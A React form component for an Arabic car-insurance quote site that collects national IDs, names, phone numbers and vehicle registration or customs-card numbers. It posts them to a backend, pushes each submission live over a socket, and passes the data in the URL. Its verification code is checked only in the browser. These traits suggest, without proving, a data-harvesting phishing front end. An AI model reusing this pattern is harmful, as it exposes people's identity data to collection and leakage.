import axios from "axios";
import React, { useState } from "react";
import { api_route, getKeysWithTrueValue, socket } from "../App";
import { TailSpin } from "react-loader-spinner";

const Apply = ({ setLoading, loading }) => {
  const [type, setType] = useState("تأمين جديد");
  // const query = new URLSearchParams(window.location.search);
  // const data = JSON.parse(query.get("data"));
  const [tameenType, setTameenType] = useState("أستمارة");
  const [nationalId, setNationalId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [car_year, setcar_year] = useState("2024");
  const [carHolderName, setCarHolderName] = useState("");
  const [birth_date, setBirthDate] = useState("");
  const [Customs_card, setCustomsCard] = useState("");
  const [phone, setPhone] = useState("");
  const [sellerId, setSellerId] = useState("");
  const [captecha, setCapetcha] = useState("");
  const [verfiy, setVrefiy] = useState(Math.floor(1000 + Math.random() * 9000));
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(false)
    console.log(captecha, verfiy);
    if (captecha != verfiy) {
      return setError("خطأ في رمز التحقق");
    } else {
      setLoad(true);

      const data = {
        type,
        tameenType,
        national_id: nationalId,
        serialNumber,
        car_year,
        carHolderName,
        sellerId,
        birth_date,
        Customs_card,
        phone,
      };
      try {
        await axios.post(api_route + "/reg", data).then(({ data }) => {
          socket.emit("newData", data);
          return (window.location.href = `/reg?data=${JSON.stringify(data)}`);
        });
      } catch (error) {
      } finally {
        setLoading(false);
      }
    }
  };
  console.log(verfiy);
  return (
    <div className="w-full flex flex-col items-center justify-center gap-y-3">
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-black bg-opacity-60">
          <img src="/logo.svg" className="w-14 h-14" />
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">يتم المعالجة</span>
          </div>
        </div>
      ) : (
        ""
      )}

      <div class="p-8 text-white text-center shadow-lg bg-gradient-to-r from-primary-500 to-primary-600 rounded-t-2xl bg-[#146394] w-full">
        <h1 class="text-2xl font-bold mb-">قارن، أمّن، أستلم وثيقتك</h1>
        <p class="opacity-90 my-2">
          مكان واحد وفّر عليك البحث بين أكثر من 20 شركة تأمين
        </p>
        <p class="opacity-90 text-yellow-200">خصومات حتى 30% على الخدمات</p>
      </div>

      <div className="flex gap-2  items-start justify-around pt-2 border-t -mt-10 w-11/12  bg-white rounded-xl">
        <div className=" w-1/5 flex flex-col gap-y-1  py-3 justify-center items-center rounded-md text-gray-700">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            class="lucide lucide-plane w-8 h-8 mb-2"
            aria-hidden="true"
          >
            <path d="M17.8 19.2 16 11l3.5-3.5C21 6 21.5 4 21 3c-1-.5-3 0-4.5 1.5L13 8 4.8 6.2c-.5-.1-.9.1-1.1.5l-.3.5c-.2.5-.1 1 .3 1.3L9 12l-2 3H4l-1 1 3 2 2 3 1-1v-3l3-2 3.5 5.3c.3.4.8.5 1.3.3l.5-.2c.4-.3.6-.7.5-1.2z"></path>
          </svg>
          <span className="">سفر</span>
        </div>
        <div className=" w-1/5 flex flex-col  py-3 items-center rounded-md text-gray-700">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            class="lucide lucide-activity w-8 h-8 mb-2"
            aria-hidden="true"
          >
            <path d="M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2"></path>
          </svg>
          <span className="text-center">اخطاء طبية</span>
        </div>

        <div className="  w-1/5 flex flex-col gap-y-1  py-3 justify-center items-center rounded-md text-gray-700">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            class="lucide lucide-stethoscope w-8 h-8 mb-2"
            aria-hidden="true"
          >
            <path d="M11 2v2"></path>
            <path d="M5 2v2"></path>
            <path d="M5 3H4a2 2 0 0 0-2 2v4a6 6 0 0 0 12 0V5a2 2 0 0 0-2-2h-1"></path>
            <path d="M8 15a6 6 0 0 0 12 0v-3"></path>
            <circle cx="20" cy="10" r="2"></circle>
          </svg>
          <span className="">طبي</span>
        </div>
        <div className="text-[#146394] bg-blue-50  w-1/5 flex flex-col gap-y-1  py-3 justify-center items-center rounded-md border-b-4 border-yellow-400">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            class="lucide lucide-car w-8 h-8 mb-2"
            aria-hidden="true"
          >
            <path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"></path>
            <circle cx="7" cy="17" r="2"></circle>
            <path d="M9 17h6"></path>
            <circle cx="17" cy="17" r="2"></circle>
          </svg>

          <span className="font-bold">مركبات</span>
        </div>
      </div>
      <div className="w-full flex items-center justify-around  px-5 ">
        <button
          className={
            type === "نقل الملكية"
              ? "bg-[#146394] text-white w-1/2 p-2 text-base rounded-l-md "
              : "w-1/2 bg-gray-100   p-2 text-base rounded-l-md"
          }
          onClick={() => setType("نقل الملكية")}
        >
          نقل الملكية
        </button>
        <button
          className={
            type === "تأمين جديد"
              ? "bg-[#146394] text-white w-1/2 p-2 text-base rounded-r-md "
              : "w-1/2 bg-gray-100   p-2 text-base rounded-r-md"
          }
          onClick={() => setType("تأمين جديد")}
        >
          تأمين جديد
        </button>
      </div>

      <div className="w-11/12 flex items-center justify-around    px-2    flex-col">
        {type === "تأمين جديد" ? (
          <>
            <div
              className="flex flex-col w-full   text-base px-2 py-3 gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>رقم الهوية / الإقامة </span>
              <input
                required
                type="text"
                inputMode="numeric"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={nationalId}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setNationalId(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base px-2 py-3 gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>اسم مالك الوثيقة كاملآ</span>
              <input
                required
                type="text"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                minLength={6}
                value={carHolderName}
                onChange={(e) => setCarHolderName(e.target.value)}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base px-2 py-3 gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>رقم الهاتف</span>
              <input
                required
                type="text"
                inputMode="numeric"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={phone}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setPhone(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>
            <div className="w-full flex items-center gap-x-3 justify-around mt-2  ">
              <span
                className={
                  tameenType === "بطاقة جمركية"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black  border-2 text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("بطاقة جمركية")}
              >
                بطاقة جمركية
              </span>
              <span
                className={
                  tameenType === "أستمارة"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black  border-2 text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("أستمارة")}
              >
                أستمارة{" "}
              </span>
            </div>
          </>
        ) : (
          ""
        )}
        {type === "تأمين جديد" ? (
          tameenType === "أستمارة" ? (
            <form
              className=" w-full  justify-center flex flex-col items-center   gap-y-5"
              onSubmit={handleSubmit}
            >
              <div
                className="flex flex-col w-full   text-base px-2 py-3 gap-y-2 text-gray-700 font-bold"
                dir="rtl"
              >
                <span>الرقم التسلسلي </span>
                <input
                  required
                  type="text"
                  className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                  value={serialNumber}
                  onChange={(e) => setSerialNumber(e.target.value)}
                />
              </div>
              <div
                className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                dir="rtl"
              >
                <div className="flex flex-col gap-y-2 text-base p-2 pb-8">
                  <span>رمز التحقق </span>

                  <input
                    required
                    type="text"
                    placeholder=""
                    className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                    value={captecha}
                    min={4}
                    max={4}
                    onChange={(e) => setCapetcha(e.target.value)}
                  />
                </div>
                <div className="flex gap-x-2 text-2xl w-full items-center">
                  <div
                    className="text-base"
                    onClick={() =>
                      setVrefiy(Math.floor(1000 + Math.random() * 9000))
                    }
                  >
                    🔄
                  </div>
                  <div className="flex gap-x-2 flex-row-reverse flex-1 items-center justify-center">
                    {verfiy
                      .toString()
                      .split("")
                      .map((v, i) => {
                        return (
                          <>
                            <span
                              className={`${
                                i === 0 || i === 3
                                  ? "text-blue-600"
                                  : "text-green-600"
                              } font-bold shadow-2xl`}
                            >
                              {v}
                            </span>
                          </>
                        );
                      })}
                  </div>
                </div>
              </div>
              {error && (
                <span className="w-full text-center text-red-500">{error}</span>
              )}
              <div className="w-full flex justify-center items-center px-2 py-2 text-center text-sm gap-x-2">
                أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
                و/أو مركز المعلومات الوطني عن بياناتي
              </div>
              <div className="w-full flex justify-center items-center my-2">
                <button className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full">
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <TailSpin
                        height="30"
                        width="30"
                        color="white"
                        ariaLabel="tail-spin-loading"
                        radius="1"
                        wrapperStyle={{}}
                        wrapperClass=""
                        visible={true}
                      />
                    </div>
                  ) : (
                    "إظهار العروض"
                  )}
                </button>
              </div>
            </form>
          ) : (
            <form
              className=" w-full  justify-center flex flex-col items-center  py-3 px-2 "
              onSubmit={handleSubmit}
            >
              <div
                className="flex flex-col w-full   text-base  py-3 gap-y-2 text-gray-700 font-bold"
                dir="rtl"
              >
                <span>
                  سنة الموديل <span className="text-red-500">*</span>
                </span>
                <select
                  required
                  type="text"
                  inputMode="numeric"
                  className="border px-1 text-right  py-2  border-gray-400 outline-blue-500 rounded-md "
                  maxLength={10}
                  minLength={10}
                  value={car_year}
                  dir="rtl"
                  onChange={(e) => setcar_year(e.target.value)}
                >
                  <option className="" hidden>
                    إختر
                  </option>
                  <option value="2000">2000</option>
                  <option value="2001">2001</option>
                  <option value="2002">2002</option>
                  <option value="2003">2003</option>
                  <option value="2004">2004</option>
                  <option value="2005">2005</option>
                  <option value="2006">2006</option>
                  <option value="2007">2007</option>
                  <option value="2008">2008</option>
                  <option value="2009">2009</option>
                  <option value="2010">2010</option>
                  <option value="2011">2011</option>
                  <option value="2012">2012</option>
                  <option value="2013">2013</option>
                  <option value="2014">2014</option>
                  <option value="2015">2015</option>
                  <option value="2016">2016</option>
                  <option value="2017">2017</option>
                  <option value="2018">2018</option>
                  <option value="2019">2019</option>
                  <option value="2020">2020</option>
                  <option value="2021">2021</option>
                  <option value="2022">2022</option>
                  <option value="2023">2023</option>
                  <option value="2024">2024</option>
                  <option value="2025">2025</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                </select>
              </div>
              <div
                className="flex flex-col w-full   text-base  pt-2 pb-8 gap-y-2 text-gray-700 font-bold"
                dir="rtl"
              >
                <span>رقم البطاقة الجمركية</span>

                <input
                  required
                  type="text"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  value={Customs_card}
                  onChange={(e) => setCustomsCard(e.target.value)}
                />
              </div>
              <div
                className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                dir="rtl"
              >
                <div className="flex flex-col gap-y-2 text-base pb-8">
                  <span>رمز التحقق </span>

                  <input
                    required
                    type="text"
                    placeholder=""
                    className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                    value={captecha}
                    min={4}
                    max={4}
                    onChange={(e) => setCapetcha(e.target.value)}
                  />
                </div>
                <div className="flex gap-x-4 text-2xl justify-center items-center">
                  <div
                    className="text-base"
                    onClick={() =>
                      setVrefiy(Math.floor(1000 + Math.random() * 9000))
                    }
                  >
                    🔄
                  </div>
                  <div className="flex gap-x-2 flex-row-reverse flex-1 items-center justify-center">
                    {verfiy
                      .toString()
                      .split("")
                      .map((v, i) => {
                        return (
                          <>
                            <span
                              className={`${
                                i === 0 || i === 3
                                  ? "text-blue-600"
                                  : "text-green-600"
                              } font-bold shadow-2xl`}
                            >
                              {v}
                            </span>
                          </>
                        );
                      })}
                  </div>
                </div>
              </div>

              {error && (
                <span className="w-full text-center text-red-500 pt-2">
                  {error}
                </span>
              )}

              <div className="w-full flex justify-center items-center px-2 py-4 text-center text-sm gap-x-2">
                أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
                و/أو مركز المعلومات الوطني عن بياناتي
              </div>
              <div className="w-full flex justify-center items-center my-2">
                <button className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full">
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <TailSpin
                        height="30"
                        width="30"
                        color="white"
                        ariaLabel="tail-spin-loading"
                        radius="1"
                        wrapperStyle={{}}
                        wrapperClass=""
                        visible={true}
                      />
                    </div>
                  ) : (
                    "إظهار العروض"
                  )}
                </button>
              </div>
            </form>
          )
        ) : (
          <form
            className=" w-full  justify-center flex flex-col items-center  p-3 gap-y-3"
            onSubmit={handleSubmit}
          >
            <div
              className="flex flex-col w-full   text-base   gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>رقم الهوية للبائع</span>
              <input
                required
                type="text"
                inputMode="numeric"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={sellerId}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setSellerId(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base   gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>رقم الهوية للمشتري</span>
              <input
                required
                type="text"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                minLength={6}
                value={nationalId}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setNationalId(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base   gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>أسم مقدم الطلب كاملآ </span>
              <input
                required
                type="text"
                inputMode="numeric"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={carHolderName}
                onChange={(e) => setCarHolderName(e.target.value)}
              />
            </div>

            <div
              className="flex flex-col w-full   text-base  gap-y-2 text-gray-700 font-bold"
              dir="rtl"
            >
              <span>رقم الهاتف</span>
              <input
                required
                type="text"
                inputMode="numeric"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={phone}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setPhone(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>

            <div className="w-full flex items-center gap-x-3 justify-around mt-2  ">
              <span
                className={
                  tameenType === "بطاقة جمركية"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black  border-2 text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("بطاقة جمركية")}
              >
                بطاقة جمركية
              </span>
              <span
                className={
                  tameenType === "أستمارة"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black  border-2 text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("أستمارة")}
              >
                أستمارة{" "}
              </span>
            </div>

            {tameenType === "أستمارة" ? (
              <div className=" w-full  justify-center flex flex-col items-center   gap-y-5">
                <div
                  className="flex flex-col w-full   text-base px-2 py-3 gap-y-2 text-gray-700 font-bold"
                  dir="rtl"
                >
                  <span>الرقم التسلسلي </span>
                  <input
                    required
                    type="text"
                    className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                    value={serialNumber}
                    onChange={(e) => setSerialNumber(e.target.value)}
                  />
                </div>
                <div
                  className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                  dir="rtl"
                >
                  <div className="flex flex-col gap-y-2 text-base p-2 pb-8">
                    <span>رمز التحقق </span>
                    <input
                      required
                      type="text"
                      placeholder=""
                      className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                      value={captecha}
                      min={4}
                      max={4}
                      onChange={(e) => setCapetcha(e.target.value)}
                    />
                  </div>
                  <div className="flex gap-x-2 text-2xl w-full items-center">
                    <div
                      className="text-base"
                      onClick={() =>
                        setVrefiy(Math.floor(1000 + Math.random() * 9000))
                      }
                    >
                      🔄
                    </div>
                    <div className="flex gap-x-2 flex-row-reverse flex-1 items-center justify-center">
                      {verfiy
                        .toString()
                        .split("")
                        .map((v, i) => {
                          return (
                            <>
                              <span
                                className={`${
                                  i === 0 || i === 3
                                    ? "text-blue-600"
                                    : "text-green-600"
                                } font-bold shadow-2xl`}
                              >
                                {v}
                              </span>
                            </>
                          );
                        })}
                    </div>
                  </div>
                </div>
                {error && (
                  <span className="w-full text-center text-red-500">
                    {error}
                  </span>
                )}
                <div className="w-full flex justify-center items-center px-2 py-2 text-center text-sm gap-x-2">
                  أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
                  و/أو مركز المعلومات الوطني عن بياناتي
                </div>
                <div className="w-full flex justify-center items-center my-2">
                  <button
                    className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full"
                    type="submit"
                  >
                    {loading ? (
                      <div className="flex items-center justify-center">
                        <TailSpin
                          height="30"
                          width="30"
                          color="white"
                          ariaLabel="tail-spin-loading"
                          radius="1"
                          wrapperStyle={{}}
                          wrapperClass=""
                          visible={true}
                        />
                      </div>
                    ) : (
                      "إظهار العروض"
                    )}
                  </button>
                </div>
              </div>
            ) : (
              <div className=" w-full  justify-center flex flex-col items-center  py-3 px-2 ">
                <div
                  className="flex flex-col w-full   text-base  py-3 gap-y-2 text-gray-700 font-bold"
                  dir="rtl"
                >
                  <span>
                    سنة الموديل <span className="text-red-500">*</span>
                  </span>
                  <select
                    required
                    type="text"
                    inputMode="numeric"
                    className="border px-1 text-right  py-2  border-gray-400 outline-blue-500 rounded-md "
                    maxLength={10}
                    minLength={10}
                    value={car_year}
                    dir="rtl"
                    onChange={(e) => setcar_year(e.target.value)}
                  >
                    <option className="" hidden>
                      إختر
                    </option>
                    <option value="2000">2000</option>
                    <option value="2001">2001</option>
                    <option value="2002">2002</option>
                    <option value="2003">2003</option>
                    <option value="2004">2004</option>
                    <option value="2005">2005</option>
                    <option value="2006">2006</option>
                    <option value="2007">2007</option>
                    <option value="2008">2008</option>
                    <option value="2009">2009</option>
                    <option value="2010">2010</option>
                    <option value="2011">2011</option>
                    <option value="2012">2012</option>
                    <option value="2013">2013</option>
                    <option value="2014">2014</option>
                    <option value="2015">2015</option>
                    <option value="2016">2016</option>
                    <option value="2017">2017</option>
                    <option value="2018">2018</option>
                    <option value="2019">2019</option>
                    <option value="2020">2020</option>
                    <option value="2021">2021</option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                  </select>
                </div>
                <div
                  className="flex flex-col w-full   text-base  pt-2 pb-8 gap-y-2 text-gray-700 font-bold"
                  dir="rtl"
                >
                  <span>رقم البطاقة الجمركية</span>

                  <input
                    required
                    type="text"
                    className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                    value={Customs_card}
                    onChange={(e) => setCustomsCard(e.target.value)}
                  />
                </div>
                <div
                  className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                  dir="rtl"
                >
                  <div className="flex flex-col gap-y-2 text-base pb-8">
                    <span>رمز التحقق </span>

                    <input
                      required
                      type="text"
                      placeholder=""
                      className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                      value={captecha}
                      min={4}
                      max={4}
                      onChange={(e) => setCapetcha(e.target.value)}
                    />
                  </div>
                  <div className="flex gap-x-4 text-2xl justify-center items-center">
                    <div
                      className="text-base"
                      onClick={() =>
                        setVrefiy(Math.floor(1000 + Math.random() * 9000))
                      }
                    >
                      🔄
                    </div>
                    <div className="flex gap-x-2 flex-row-reverse flex-1 items-center justify-center">
                      {verfiy
                        .toString()
                        .split("")
                        .map((v, i) => {
                          return (
                            <>
                              <span
                                className={`${
                                  i === 0 || i === 3
                                    ? "text-blue-600"
                                    : "text-green-600"
                                } font-bold shadow-2xl`}
                              >
                                {v}
                              </span>
                            </>
                          );
                        })}
                    </div>
                  </div>
                </div>

                {error && (
                  <span className="w-full text-center text-red-500 pt-5">
                    {error}
                  </span>
                )}

                <div className="w-full flex justify-center items-center px-2 py-4 text-center text-sm gap-x-2">
                  أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
                  و/أو مركز المعلومات الوطني عن بياناتي
                </div>
                <div className="w-full flex justify-center items-center my-2">
                  <button className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full">
                    {loading ? (
                      <div className="flex items-center justify-center">
                        <TailSpin
                          height="30"
                          width="30"
                          color="white"
                          ariaLabel="tail-spin-loading"
                          radius="1"
                          wrapperStyle={{}}
                          wrapperClass=""
                          visible={true}
                        />
                      </div>
                    ) : (
                      "إظهار العروض"
                    )}
                  </button>
                </div>
              </div>
            )}
          </form>
        )}
      </div>
    </div>
  );
};

export default Apply;

// <div className="flex flex-col w-full p-2 gap-y-4  text-xl" dir="rtl">
//   <label className="">تاريخ الميلاد </label>
//   <input
//     required
//     type="date"
//     placeholder="   تاريخ  الميلاد"
//     className="border-2 p-3 border-gray-400 outline-blue-500 "
//     value={birth_date}
//     onChange={(e) => setBirthDate(e.target.value)}
//   />
// </div>;
